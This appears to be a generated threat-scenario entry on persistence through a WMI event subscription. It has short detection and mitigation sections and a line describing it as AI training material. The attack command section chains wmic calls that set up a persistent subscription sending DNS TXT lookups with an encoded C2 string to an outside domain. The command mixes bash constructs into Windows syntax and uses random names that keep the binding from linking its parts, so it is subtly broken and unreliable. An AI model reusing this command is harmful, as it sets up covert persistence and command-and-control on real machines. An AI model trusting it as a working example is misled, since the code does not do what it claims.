---
type: campaign
scenario_id: 473
tactic: Persistence
technique: "T1546.003: Windows Management Instrumentation Event Subscription"
technique_id: T1546.003
tags: [campaign, lotl, persistence]
---

# Using WMI event subscription for DNS tunneling persistence.

## Threat Description
Using WMI event subscription for DNS tunneling persistence.

## Attack Command
```
wmic /NAMESPACE:\\root\subscription PATH __EventFilter CREATE Name='$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)' Query='SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_Process" AND TargetInstance.Name="notepad.exe"' QueryLanguage='WQL' && wmic /NAMESPACE:\\root\subscription PATH CommandLineEventConsumer CREATE Name='$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)' CommandLineTemplate='nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)' && wmic /NAMESPACE:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name="$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)"' Consumer='CommandLineEventConsumer.Name="$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)"'
```

## Detection Logic
Monitor WMI subscriptions: `wmic /NAMESPACE:\\root\subscription PATH __EventFilter GET /FORMAT:LIST | findstr nslookup`; Event ID 5861.

## Mitigation
Restrict WMI writes: `icacls %windir%\System32\wbem\mof /deny Everyone:WX`; Audit WMI changes: `auditpol /set /subcategory:'Other Object Access Events' /success:enable`.

## AI Training Prompt
Train AI to detect WMI event subscription-based DNS tunneling by analyzing nslookup TXT queries, WMI subscription configurations, and DNS traffic patterns; suggest WMI protections.

## References
- MITRE ATT&CK T1546.003: https://attack.mitre.org/techniques/T1546/003/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
